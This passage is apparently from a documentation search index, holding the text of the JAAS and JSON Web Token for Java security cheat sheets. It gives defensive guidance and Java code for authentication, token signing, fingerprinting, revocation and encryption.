Map.","title":"initialize()"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#login","text":"Captures user supplied login information. The code snippet below declares an array of two callback objects which, when passed to the callbackHandler.handle method in the callbackHandler.java program, will be loaded with a username and password provided interactively by the user: NameCallback nameCB = new NameCallback ( \"Username\" ); PasswordCallback passwordCB = new PasswordCallback ( \"Password\" , false ); Callback [] callbacks = new Callback [] { nameCB , passwordCB }; callbackHandler . handle ( callbacks ); Authenticates the user Retrieves the user supplied information from the callback objects: String ID = nameCallback.getName (); char[] tempPW = passwordCallback.getPassword (); Compare name and tempPW to values stored in a repository such as LDAP. Set the value of the variable succeeded and return to Main() .","title":"login()"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#commit","text":"Once the users credentials are successfully verified during login() , the JAAS authentication framework associates the credentials, as needed, with the subject. There are two types of credentials, Public and Private : Public credentials include public keys. Private credentials include passwords and public keys. Principals (i.e. Identities the subject has other than their login name) such as employee number or membership ID in a user group are added to the subject. Below, is an example commit() method where first, for each group the authenticated user has membership in, the group name is added as a principal to the subject. The subject's username is then added to their public credentials. Code snippet setting then adding any principals and a public credentials to a subject: public boolean commit () { If ( userAuthenticated ) { Set groups = UserService . findGroups ( username ); for ( Iterator itr = groups . iterator (); itr . hasNext (); { String groupName = ( String ) itr . next (); UserGroupPrincipal group = new UserGroupPrincipal ( GroupName ); subject . getPrincipals (). add ( group ); } UsernameCredential cred = new UsernameCredential ( username ); subject . getPublicCredentials (). add ( cred ); } }","title":"commit()"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#abort","text":"The abort() method is called when authentication doesn't succeed. Before the abort() method exits the LoginModule , care should be taken to reset state including the username and password input fields.","title":"abort()"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#logout","text":"The release of the users principals and credentials when LoginContext.logout is called: public boolean logout () { if ( ! subject . isReadOnly ()) { Set principals = subject . getPrincipals ( UserGroupPrincipal . class ); subject . getPrincipals (). removeAll ( principals ); Set creds = subject . getPublicCredentials ( UsernameCredential . class ); subject . getPublicCredentials (). removeAll ( creds ); return true ; } else { return false ; } }","title":"logout()"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#callbackhandlerjava","text":"The callbackHandler is in a source ( .java ) file separate from any single LoginModule so that it can service a multitude of LoginModules with differing callback objects: Creates instance of the CallbackHandler class and has only one method, handle() . A CallbackHandler servicing a LoginModule requiring username & password to login: public void handle ( Callback [] callbacks ) { for ( int i = 0 ; i < callbacks . length ; i ++ ) { Callback callback = callbacks [ i ] ; if ( callback instanceof NameCallback ) { NameCallback nameCallBack = ( NameCallback ) callback ; nameCallBack . setName ( username ); } else if ( callback instanceof PasswordCallback ) { PasswordCallback passwordCallBack = ( PasswordCallback ) callback ; passwordCallBack . setPassword ( password . toCharArray ()); } } }","title":"CallbackHandler.java"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#related-articles","text":"JAAS in Action , Michael Cot\u00e9, posted on September 27, 2009, URL as 5/14/2012. Pistoia Marco, Nagaratnam Nataraj, Koved Larry, Nadalin Anthony from book \"Enterprise Java Security\" - Addison-Wesley, 2004 .","title":"Related Articles"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#disclosure","text":"All of the code in the attached JAAS cheat sheet has been copied verbatim from this free source .","title":"Disclosure"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html","text":"JSON Web Token Cheat Sheet for Java \u00b6 Introduction \u00b6 Many applications use JSON Web Tokens (JWT) to allow the client to indicate its identity for further exchange after authentication. From JWT.IO : JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA. JSON Web Token is used to carry information related to the identity and characteristics (claims) of a client. This information is signed by the server in order for it to detect whether it was tampered with after sending it to the client. This will prevent an attacker from changing the identity or any characteristics (for example, changing the role from simple user to admin or change the client login). This token is created during authentication (is provided in case of successful authentication) and is verified by the server before any processing. It is used by an application to allow a client to present a token representing the user's \"identity card\" to the server and allow the server to verify the validity and integrity of the token in a secure way, all of this in a stateless and portable approach (portable in the way that client and server technologies can be different including also the transport channel even if HTTP is the most often used). Token Structure \u00b6 Token structure example taken from JWT.IO : [Base64(HEADER)].[Base64(PAYLOAD)].[Base64(SIGNATURE)] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9. TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ Chunk 1: Header { \"alg\" : \"HS256\" , \"typ\" : \"JWT\" } Chunk 2: Payload { \"sub\" : \"1234567890\" , \"name\" : \"John Doe\" , \"admin\" : true } Chunk 3: Signature HMACSHA256 ( base64UrlEncode ( header ) + \".\" + base64UrlEncode ( payload ), KEY ) Objective \u00b6 This cheatsheet provides tips to prevent common security issues when using JSON Web Tokens (JWT) with Java. The tips presented in this article are part of a Java project that was created to show the correct way to handle creation and validation of JSON Web Tokens. You can find the Java project here , it uses the official JWT library . In the rest of the article, the term token refers to the JSON Web Tokens (JWT). Consideration about Using JWT \u00b6 Even if a JWT token is \"easy\" to use and allow to expose services (mostly REST style) in a stateless way, it's not the solution that fits for all applications because it comes with some caveats, like for example the question of the storage of the token (tackled in this cheatsheet) and others... If your application does not need to be fully stateless, you can consider using traditional session system provided by all web frameworks and follow the advice from the dedicated session management cheat sheet . However, for stateless applications, when well implemented, it's a good candidate. Issues \u00b6 None Hashing Algorithm \u00b6 Symptom \u00b6 This attack, described here occurs when an attacker alters the token and changes the hashing algorithm to indicate, through, the none keyword, that the integrity of the token has already been verified. As explained in the link above some libraries treated tokens signed with the none algorithm as a valid token with a verified signature , so an attacker can alter the token claims and token will be trusted by the application. How to Prevent \u00b6 First, use a JWT library that is not exposed to this vulnerability. Last, during token validation, explicitly request that the expected algorithm was used. Implementation Example \u00b6 // HMAC key - Block serialization and storage as String in JVM memory private transient byte [] keyHMAC = ...; ... //Create a verification context for the token requesting //explicitly the use of the HMAC-256 hashing algorithm JWTVerifier verifier = JWT . require ( Algorithm . HMAC256 ( keyHMAC )). build (); //Verify the token, if the verification fail then a exception is throwed DecodedJWT decodedToken = verifier . verify ( token ); Token Sidejacking \u00b6 Symptom \u00b6 This attack occurs when a token has been intercepted/stolen by an attacker and they use it to gain access to the system using targeted user identity. How to Prevent \u00b6 A way to prevent it is to add a \"user context\" in the token. A user context will be composed of the following information: A random string that will be generated during the authentication phase. It will be sent to the client as an hardened cookie (flags: HttpOnly + Secure + SameSite + cookie prefixes ). A SHA256 hash of the random string will be stored in the token (instead of the raw value) in order to prevent any XSS issues allowing the attacker to read the random string value and setting the expected cookie. IP addresses should not be used because there are some legitimate situations in which the IP address can change during the same session. For example, when an user accesses an application through their mobile device and the mobile operator changes during the exchange, then the IP address may (often) change. Moreover, using the IP address can potentially cause issues with European GDPR compliancy. During token validation, if the received token does not contain the right context (for example, if it has been replayed), then it must be rejected. Implementation example \u00b6 Code to create the token after successful authentication. // HMAC key - Block serialization and storage as String in JVM memory private transient byte [] keyHMAC = ...; // Random data generator private SecureRandom secureRandom = new SecureRandom (); ... //Generate a random string that will constitute the fingerprint for this user byte [] randomFgp = new byte [ 50 ] ; secureRandom . nextBytes ( randomFgp ); String userFingerprint = DatatypeConverter . printHexBinary ( randomFgp ); //Add the fingerprint in a hardened cookie - Add cookie manually because //SameSite attribute is not supported by javax.servlet.http.Cookie class String fingerprintCookie = \"__Secure-Fgp=\" + userFingerprint + \"; SameSite=Strict; HttpOnly; Secure\" ; response . addHeader ( \"Set-Cookie\" , fingerprintCookie ); //Compute a SHA256 hash of the fingerprint in order to store the //fingerprint hash (instead of the raw value) in the token //to prevent an XSS to be able to read the fingerprint and //set the expected cookie itself MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] userFingerprintDigest = digest . digest ( userFingerprint . getBytes ( \"utf-8\" )); String userFingerprintHash = DatatypeConverter . printHexBinary ( userFingerprintDigest ); //Create the token with a validity of 15 minutes and client context (fingerprint) information Calendar c = Calendar . getInstance (); Date now = c . getTime (); c . add ( Calendar . MINUTE , 15 ); Date expirationDate = c . getTime (); Map < String , Object > headerClaims = new HashMap <> (); headerClaims . put ( \"typ\" , \"JWT\" ); String token = JWT . create (). withSubject ( login ) . withExpiresAt ( expirationDate ) . withIssuer ( this . issuerID ) . withIssuedAt ( now ) . withNotBefore ( now ) . withClaim ( \"userFingerprint\" , userFingerprintHash ) . withHeader ( headerClaims ) . sign ( Algorithm . HMAC256 ( this . keyHMAC )); Code to validate the token. // HMAC key - Block serialization and storage as String in JVM memory private transient byte [] keyHMAC = ...; ... //Retrieve the user fingerprint from the dedicated cookie String userFingerprint = null ; if ( request . getCookies () != null && request . getCookies (). length > 0 ) { List < Cookie > cookies = Arrays . stream ( request . getCookies ()). collect ( Collectors . toList ()); Optional < Cookie > cookie = cookies . stream (). filter ( c -> \"__Secure-Fgp\" . equals ( c . getName ())). findFirst (); if ( cookie . isPresent ()) { userFingerprint = cookie . get (). getValue (); } } //Compute a SHA256 hash of the received fingerprint in cookie in order to compare //it to the fingerprint hash stored in the token MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] userFingerprintDigest = digest . digest ( userFingerprint . getBytes ( \"utf-8\" )); String userFingerprintHash = DatatypeConverter . printHexBinary ( userFingerprintDigest ); //Create a verification context for the token JWTVerifier verifier = JWT . require ( Algorithm . HMAC256 ( keyHMAC )) . withIssuer ( issuerID ) . withClaim ( \"userFingerprint\" , userFingerprintHash ) . build (); //Verify the token, if the verification fail then an exception is thrown DecodedJWT decodedToken = verifier . verify ( token ); No Built-In Token Revocation by the User \u00b6 Symptom \u00b6 This problem is inherent to JWT because a token only becomes invalid when it expires. The user has no built-in feature to explicitly revoke the validity of a token. This means that if it is stolen, a user cannot revoke the token itself thereby blocking the attacker. How to Prevent \u00b6 A way to protect against this is to implement a token blacklist that will be used to mimic the \"logout\" feature that exists with traditional session management system. The blacklist will keep a digest (SHA-256 encoded in HEX) of the token with a revocation date. This entry must endure at least until the expiration of the token. When the user wants to \"logout\" then it call a dedicated service that will add the provided user token to the blacklist resulting in an immediate invalidation of the token for further usage in the application. Implementation Example \u00b6 Blacklist Storage \u00b6 A database table with the following structure will be used as the central blacklist storage. create table if not exists revoked_token ( jwt_token_digest varchar ( 255 ) primary key , revocation_date timestamp default now ()); Token Revocation Management \u00b6 Code in charge of adding a token to the blacklist and checking if a token is revoked. /** * Handle the revocation of the token (logout). * Use a DB in order to allow multiple instances to check for revoked token * and allow cleanup at centralized DB level. */ public class TokenRevoker { /** DB Connection */ @Resource ( \"jdbc/storeDS\" ) private DataSource storeDS ; /** * Verify if a digest encoded in HEX of the ciphered token is present * in the revocation table * * @param jwtInHex Token encoded in HEX * @return Presence flag * @throws Exception If any issue occur during communication with DB */ public boolean isTokenRevoked ( String jwtInHex ) throws Exception { boolean tokenIsPresent = false ; if ( jwtInHex != null && ! jwtInHex . trim (). isEmpty ()) { //Decode the ciphered token byte [] cipheredToken = DatatypeConverter . parseHexBinary ( jwtInHex ); //Compute a SHA256 of the ciphered token MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] cipheredTokenDigest = digest . digest ( cipheredToken ); String jwtTokenDigestInHex = DatatypeConverter . printHexBinary ( cipheredTokenDigest ); //Search token digest in HEX in DB try ( Connection con = this . storeDS . getConnection ()) { String query = \"select jwt_token_digest from revoked_token where jwt_token_digest = ?\" ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , jwtTokenDigestInHex ); try ( ResultSet rSet = pStatement . executeQuery ()) { tokenIsPresent = rSet . next (); } } } } return tokenIsPresent ; } /** * Add a digest encoded in HEX of the ciphered token to the revocation token table * * @param jwtInHex Token encoded in HEX * @throws Exception If any issue occur during communication with DB */ public void revokeToken ( String jwtInHex ) throws Exception { if ( jwtInHex != null && ! jwtInHex . trim (). isEmpty ()) { //Decode the ciphered token byte [] cipheredToken = DatatypeConverter . parseHexBinary ( jwtInHex ); //Compute a SHA256 of the ciphered token MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] cipheredTokenDigest = digest . digest ( cipheredToken ); String jwtTokenDigestInHex = DatatypeConverter . printHexBinary ( cipheredTokenDigest ); //Check if the token digest in HEX is already in the DB and add it if it is absent if ( ! this . isTokenRevoked ( jwtInHex )) { try ( Connection con = this . storeDS . getConnection ()) { String query = \"insert into revoked_token(jwt_token_digest) values(?)\" ; int insertedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , jwtTokenDigestInHex ); insertedRecordCount = pStatement . executeUpdate (); } if ( insertedRecordCount != 1 ) { throw new IllegalStateException ( \"Number of inserted record is invalid,\" + \" 1 expected but is \" + insertedRecordCount ); } } } } } Token Information Disclosure \u00b6 Symptom \u00b6 This attack occurs when an attacker has access to a token (or a set of tokens) and extracts information stored in it (the contents of JWT tokens are base64 encoded, but is not encrypted by default) in order to obtain information about the system. Information can be for example the security roles, login format... How to Prevent \u00b6 A way to protect against this attack is to cipher the token using, for example, a symmetric algorithm. It's also important to protect the ciphered data against attack like Padding Oracle or any other attack using cryptanalysis. In order to achieve all these goals, the AES- GCM algorithm is used which provides Authenticated Encryption with Associated Data . More details from here : AEAD primitive (Authenticated Encryption with Associated Data) provides functionality of symmetric authenticated encryption. Implementations of this primitive are secure against adaptive chosen ciphertext attacks. When encrypting a plaintext one can optionally provide associated data that should be authenticated but not encrypted. That is, the encryption with associated data ensures authenticity (ie. who the sender is) and integrity (ie. data has not been tampered with) of that data, but not its secrecy. See RFC5116: https://tools.ietf.org/html/rfc5116 Note: Here ciphering is added mainly to hide internal information but it's very important to remember that the first protection against tampering of the JWT token is the signature. So, the token signature and its verification must be always in place. Implementation Example \u00b6 Token Ciphering \u00b6 Code in charge of managing the ciphering. Google Tink dedicated crypto library is used to handle ciphering operations in order to use built-in best practices provided by this library. /** * Handle ciphering and deciphering of the token using AES-GCM. * * @see \"https://github.com/google/tink/blob/master/docs/JAVA-HOWTO.md\" */ public class TokenCipher { /** * Constructor - Register AEAD configuration * * @throws Exception If any issue occur during AEAD configuration registration */ public TokenCipher () throws Exception { AeadConfig . register (); } /** * Cipher a JWT * * @param jwt Token to cipher * @param keysetHandle Pointer to the keyset handle * @return The ciphered version of the token encoded in HEX * @throws Exception If any issue occur during token ciphering operation */ public String cipherToken ( String jwt , KeysetHandle keysetHandle ) throws Exception { //Verify parameters if ( jwt == null || jwt . isEmpty () || keysetHandle == null ) { throw new IllegalArgumentException ( \"Both parameters must be specified!\" ); } //Get the primitive Aead aead = AeadFactory . getPrimitive ( keysetHandle ); //Cipher the token byte [] cipheredToken = aead . encrypt ( jwt . getBytes (), null ); return DatatypeConverter . printHexBinary ( cipheredToken ); } /** * Decipher a JWT * * @param jwtInHex Token to decipher encoded in HEX * @param keysetHandle Pointer to the keyset handle * @return The token in clear text * @throws Exception If any issue occur during token deciphering operation */ public String decipherToken ( String jwtInHex , KeysetHandle keysetHandle ) throws Exception { //Verify parameters if ( jwtInHex == null || jwtInHex . isEmpty () || keysetHandle == null ) { throw new IllegalArgumentException ( \"Both parameters must be specified !\" ); } //Decode the ciphered token byte [] cipheredToken = DatatypeConverter . parseHexBinary ( jwtInHex ); //Get the primitive Aead aead = AeadFactory . getPrimitive ( keysetHandle ); //Decipher the token byte [] decipheredToken = aead . decrypt ( cipheredToken , null ); return new String ( decipheredToken ); } } Creation / Validation of the Token \u00b6 Use the token ciphering handler during the creation and the validation of the token. Load keys (ciphering key was generated and stored using Google Tink ) and setup cipher. //Load keys from configuration text/json files in order to avoid to storing keys as a String in JVM memory private transient byte [] keyHMAC = Files . readAllBytes ( Paths . get ( \"src\" , \"main\" , \"conf\" , \"key-hmac.txt\" )); private transient KeysetHandle keyCiphering = CleartextKeysetHandle . read ( JsonKeysetReader . withFile ( Paths . get ( \"src\" , \"main\" , \"conf\" , \"key-ciphering.json\" ). toFile ())); ... //Init token ciphering handler TokenCipher tokenCipher = new TokenCipher (); Token creation. //Generate the JWT token using the JWT API... //Cipher the token (String JSON representation) String cipheredToken = tokenCipher . cipherToken ( token , this . keyCiphering ); //Send the ciphered token encoded in HEX to the client in HTTP response... Token validation. //Retrieve the ciphered token encoded in HEX from the HTTP request... //Decipher the token String token = tokenCipher . decipherToken ( cipheredToken , this . keyCiphering ); //Verify the token using the JWT API... //Verify access... Token Storage on Client Side \u00b6 Symptom \u00b6 This occurs when an application stores the token in a manner exhibiting the following behavior: Automatically sent by the browser ( Cookie storage). Retrieved even if the browser is restarted (Use of browser localStorage container). Retrieved in case of XSS issue (Cookie accessible to JavaScript code or Token stored in browser local/session storage). How to Prevent \u00b6 Store the token using the browser sessionStorage container. Add it as a Bearer HTTP Authentication header with JavaScript when calling services. Add fingerprint information to the token. By storing the token in browser sessionStorage container it exposes the token to being stolen through a XSS attack. However, fingerprints added to the token prevent reuse of the stolen token by the attacker on their machine. To close a maximum of exploitation surfaces for an attacker, add a browser Content Security Policy to harden the execution context. Note: The remaining case is when an attacker uses the user's browsing context as a proxy to use the target application through the legitimate user but the Content Security Policy can prevent communication with non expected domains. It's also possible to implement the authentication service in a way that the token is issued within a hardened cookie, but in this case, protection against a Cross-Site Request Forgery attack must be implemented. Implementation Example \u00b6 JavaScript code to store the token after authentication. /* Handle request for JWT token and local storage*/ function authenticate () { const login = $ ( \"#login\" ). val (); const postData = \"login=\" + encodeURIComponent ( login ) + \"&password=test\" ; $ . post ( \"/services/authenticate\" , postData , function ( data ) { if ( data . status == \"Authentication successful!\" ) { ... sessionStorage . setItem ( \"token\" , data . token ); } else { ... sessionStorage . removeItem ( \"token\" ); } }) . fail ( function ( jqXHR , textStatus , error ) { ... sessionStorage . removeItem ( \"token\" ); }); } JavaScript code to add the token as a Bearer HTTP Authentication header when calling a service, for example a service to validate token here. /* Handle request for JWT token validation */ function validateToken () { var token = sessionStorage . getItem ( \"token\" ); if ( token == undefined || token == \"\" ) { $ ( \"#infoZone\" ). removeClass (); $ ( \"#infoZone\" ). addClass ( \"alert alert-warning\" ); $ ( \"#infoZone\" ). text ( \"Obtain a JWT token first :)\" ); return ; } $ . ajax ({ url : \"/services/validate\" , type : \"POST\" , beforeSend : function ( xhr ) { xhr . setRequestHeader ( \"Authorization\" , \"bearer \" + token ); }, success : function ( data ) { ... }, error : function ( jqXHR , textStatus , error ) { ... }, }); } Weak Token Secret \u00b6 Symptom \u00b6 When the token is protected using an HMAC based algorithm, the security of the token is entirely dependent on the strength of the secret used with the HMAC. If an attacker can obtain a valid JWT, they can then carry out an offline attack and attempt to crack the secret using tools such as John the Ripper or Hashcat . If they are successful, they would then be able to modify the token and re-sign it with the key they had obtained. This could let them escalate their privileges, compromise other users' accounts, or perform other actions depending on the contents of the JWT. There are a number of guides that document this process in greater detail. How to Prevent \u00b6 The simplest way to prevent this attack is to ensure that the secret used to sign the JWTs is strong and unique, in order to make it harder for an attacker to crack. As this secret would never need to be typed by a human, it should be at least 64 characters, and generated using a secure source of randomness . Alternatively, consider the use of tokens that are signed with RSA rather than using an HMAC and secret key. Further Reading \u00b6 {JWT}.{Attack}.Playbook - A project documents the known attacks and potential security vulnerabilities and misconfigurations of JSON Web Tokens. JWT Best Practices Internet Draft","title":"JSON Web Token for Java"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#json-web-token-cheat-sheet-for-java","text":"","title":"JSON Web Token Cheat Sheet for Java"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#introduction","text":"Many applications use JSON Web Tokens (JWT) to allow the client to indicate its identity for further exchange after authentication. From JWT.IO : JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA. JSON Web Token is used to carry information related to the identity and characteristics (claims) of a client. This information is signed by the server in order for it to detect whether it was tampered with after sending it to the client. This will prevent an attacker from changing the identity or any characteristics (for example, changing the role from simple user to admin or change the client login). This token is created during authentication (is provided in case of successful authentication) and is verified by the server before any processing. It is used by an application to allow a client to present a token representing the user's \"identity card\" to the server and allow the server to verify the validity and integrity of the token in a secure way, all of this in a stateless and portable approach (portable in the way that client and server technologies can be different including also the transport channel even if HTTP is the most often used).","title":"Introduction"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#token-structure","text":"Token structure example taken from JWT.IO : [Base64(HEADER)].[Base64(PAYLOAD)].[Base64(SIGNATURE)] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9. TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ Chunk 1: Header { \"alg\" : \"HS256\" , \"typ\" : \"JWT\" } Chunk 2: Payload { \"sub\" : \"1234567890\" , \"name\" : \"John Doe\" , \"admin\" : true } Chunk 3: Signature HMACSHA256 ( base64UrlEncode ( header ) + \".\" + base64UrlEncode ( payload ), KEY )","title":"Token Structure"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#objective","text":"This cheatsheet provides tips to prevent common security issues when using JSON Web Tokens (JWT) with Java. The tips presented in this article are part of a Java project that was created to show the correct way to handle creation and validation of JSON Web Tokens. You can find the Java project here , it uses the official JWT library . In the rest of the article, the term token refers to the JSON Web Tokens (JWT).","title":"Objective"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#consideration-about-using-jwt","text":"Even if a JWT token is \"easy\" to use and allow to expose services (mostly REST style) in a stateless way, it's not the solution that fits for all applications because it comes with some caveats, like for example the question of the storage of the token (tackled in this cheatsheet) and others... If your application does not need to be fully stateless, you can consider using traditional session system provided by all web frameworks and follow the advice from the dedicated session management cheat sheet . However, for stateless applications, when well implemented, it's a good candidate.","title":"Consideration about Using JWT"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#issues","text":"","title":"Issues"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#none-hashing-algorithm","text":"","title":"None Hashing Algorithm"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#symptom","text":"This attack, described here occurs when an attacker alters the token and changes the hashing algorithm to indicate, through, the none keyword, that the integrity of the token has already been verified. As explained in the link above some libraries treated tokens signed with the none algorithm as a valid token with a verified signature , so an attacker can alter the token claims and token will be trusted by the application.","title":"Symptom"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent","text":"First, use a JWT library that is not exposed to this vulnerability. Last, during token validation, explicitly request that the expected algorithm was used.","title":"How to Prevent"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#implementation-example","text":"// HMAC key - Block serialization and storage as String in JVM memory private transient byte [] keyHMAC = ...; ... //Create a verification context for the token requesting //explicitly the use of the HMAC-256 hashing algorithm JWTVerifier verifier = JWT . require ( Algorithm . HMAC256 ( keyHMAC )). build (); //Verify the token, if the verification fail then a exception is throwed DecodedJWT decodedToken = verifier . verify ( token );","title":"Implementation Example"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#token-sidejacking","text":"","title":"Token Sidejacking"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#symptom_1","text":"This attack occurs when a token has been intercepted/stolen by an attacker and they use it to gain access to the system using targeted user identity.","title":"Symptom"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_1","text":"A way to prevent it is to add a \"user context\" in the token. A user context will be composed of the following information: A random string that will be generated during the authentication phase. It will be sent to the client as an hardened cookie (flags: HttpOnly + Secure + SameSite + cookie prefixes ). A SHA256 hash of the random string will be stored in the token (instead of the raw value) in order to prevent any XSS issues allowing the attacker to read the random string value and setting the expected cookie. IP addresses should not be used because there are some legitimate situations in which the IP address can change during the same session. For example, when an user accesses an application through their mobile device and the mobile operator changes during the exchange, then the IP address may (often) change. Moreover, using the IP address can potentially cause issues with European GDPR compliancy. During token validation, if the received token does not contain the right context (for example, if it has been replayed), then it must be rejected.","title":"How to Prevent"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#implementation-example_1","text":"Code to create the token after successful authentication. // HMAC key - Block serialization and storage as String in JVM memory private transient byte [] keyHMAC = ...; // Random data generator private SecureRandom secureRandom = new SecureRandom (); ... //Generate a random string that will constitute the fingerprint for this user byte [] randomFgp = new byte [ 50 ] ; secureRandom . nextBytes ( randomFgp ); String userFingerprint = DatatypeConverter . printHexBinary ( randomFgp ); //Add the fingerprint in a hardened cookie - Add cookie manually because //SameSite attribute is not supported by javax.servlet.http.Cookie class String fingerprintCookie = \"__Secure-Fgp=\" + userFingerprint + \"; SameSite=Strict; HttpOnly; Secure\" ; response . addHeader ( \"Set-Cookie\" , fingerprintCookie ); //Compute a SHA256 hash of the fingerprint in order to store the //fingerprint hash (instead of the raw value) in the token //to prevent an XSS to be able to read the fingerprint and //set the expected cookie itself MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] userFingerprintDigest = digest . digest ( userFingerprint . getBytes ( \"utf-8\" )); String userFingerprintHash = DatatypeConverter . printHexBinary ( userFingerprintDigest ); //Create the token with a validity of 15 minutes and client context (fingerprint) information Calendar c = Calendar . getInstance (); Date now = c . getTime (); c . add ( Calendar . MINUTE , 15 ); Date expirationDate = c . getTime (); Map < String , Object > headerClaims = new HashMap <> (); headerClaims . put ( \"typ\" , \"JWT\" ); String token = JWT . create (). withSubject ( login ) . withExpiresAt ( expirationDate ) . withIssuer ( this . issuerID ) . withIssuedAt ( now ) . withNotBefore ( now ) . withClaim ( \"userFingerprint\" , userFingerprintHash ) . withHeader ( headerClaims ) . sign ( Algorithm . HMAC256 ( this . keyHMAC )); Code to validate the token. // HMAC key - Block serialization and storage as String in JVM memory private transient byte [] keyHMAC = ...; ... //Retrieve the user fingerprint from the dedicated cookie String userFingerprint = null ; if ( request . getCookies () != null && request . getCookies (). length > 0 ) { List < Cookie > cookies = Arrays . stream ( request . getCookies ()). collect ( Collectors . toList ()); Optional < Cookie > cookie = cookies . stream (). filter ( c -> \"__Secure-Fgp\" . equals ( c . getName ())). findFirst (); if ( cookie . isPresent ()) { userFingerprint = cookie . get (). getValue (); } } //Compute a SHA256 hash of the received fingerprint in cookie in order to compare //it to the fingerprint hash stored in the token MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] userFingerprintDigest = digest . digest ( userFingerprint . getBytes ( \"utf-8\" )); String userFingerprintHash = DatatypeConverter . printHexBinary ( userFingerprintDigest ); //Create a verification context for the token JWTVerifier verifier = JWT . require ( Algorithm . HMAC256 ( keyHMAC )) . withIssuer ( issuerID ) . withClaim ( \"userFingerprint\" , userFingerprintHash ) . build (); //Verify the token, if the verification fail then an exception is thrown DecodedJWT decodedToken = verifier . verify ( token );","title":"Implementation example"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#no-built-in-token-revocation-by-the-user","text":"","title":"No Built-In Token Revocation by the User"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#symptom_2","text":"This problem is inherent to JWT because a token only becomes invalid when it expires. The user has no built-in feature to explicitly revoke the validity of a token. This means that if it is stolen, a user cannot revoke the token itself thereby blocking the attacker.","title":"Symptom"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_2","text":"A way to protect against this is to implement a token blacklist that will be used to mimic the \"logout\" feature that exists with traditional session management system. The blacklist will keep a digest (SHA-256 encoded in HEX) of the token with a revocation date. This entry must endure at least until the expiration of the token. When the user wants to \"logout\" then it call a dedicated service that will add the provided user token to the blacklist resulting in an immediate invalidation of the token for further usage in the application.","title":"How to Prevent"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#implementation-example_2","text":"","title":"Implementation Example"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#blacklist-storage","text":"A database table with the following structure will be used as the central blacklist storage. create table if not exists revoked_token ( jwt_token_digest varchar ( 255 ) primary key , revocation_date timestamp default now ());","title":"Blacklist Storage"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#token-revocation-management","text":"Code in charge of adding a token to the blacklist and checking if a token is revoked. /** * Handle the revocation of the token (logout). * Use a DB in order to allow multiple instances to check for revoked token * and allow cleanup at centralized DB level. */ public class TokenRevoker { /** DB Connection */ @Resource ( \"jdbc/storeDS\" ) private DataSource storeDS ; /** * Verify if a digest encoded in HEX of the ciphered token is present * in the revocation table * * @param jwtInHex Token encoded in HEX * @return Presence flag * @throws Exception If any issue occur during communication with DB */ public boolean isTokenRevoked ( String jwtInHex ) throws Exception { boolean tokenIsPresent = false ; if ( jwtInHex != null && ! jwtInHex . trim (). isEmpty ()) { //Decode the ciphered token byte [] cipheredToken = DatatypeConverter . parseHexBinary ( jwtInHex ); //Compute a SHA256 of the ciphered token MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] cipheredTokenDigest = digest . digest ( cipheredToken ); String jwtTokenDigestInHex = DatatypeConverter . printHexBinary ( cipheredTokenDigest ); //Search token digest in HEX in DB try ( Connection con = this . storeDS . getConnection ()) { String query = \"select jwt_token_digest from revoked_token where jwt_token_digest = ?\" ; try ( PreparedStatement pStatement = con . 